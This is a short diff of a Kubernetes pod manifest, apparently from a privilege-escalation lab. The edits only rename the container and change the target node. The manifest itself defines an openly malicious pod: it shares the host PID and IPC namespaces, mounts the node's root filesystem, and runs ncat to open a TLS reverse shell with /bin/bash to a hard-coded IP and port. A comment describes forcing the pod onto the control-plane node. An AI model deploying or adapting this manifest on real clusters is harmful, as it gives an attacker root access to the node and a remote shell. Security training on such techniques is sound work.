@@ -12,7 +12,7 @@ spec:
   hostPID: true
   hostIPC: true
   containers:
-  - name: malicious-pod
+  - name: malicious-container
     image: raesene/ncat
     command: [ "/bin/sh", "-c", "--" ]
     args: [ HOST="10.0.2.208";PORT="3116";ncat --ssl $HOST $PORT -e /bin/bash;" ]
@@ -21,7 +21,7 @@ spec:
     volumeMounts:
     - mountPath: /host
       name: noderoot
-  nodeName: cap-proj-1 # Force your pod to run on the control-plane node by uncommenting this line and changing to a control-plane node name
+  nodeName: worker-1 # Force your pod to run on the control-plane node by uncommenting this line and changing to a control-plane node name
   volumes:
   - name: noderoot
     hostPath:
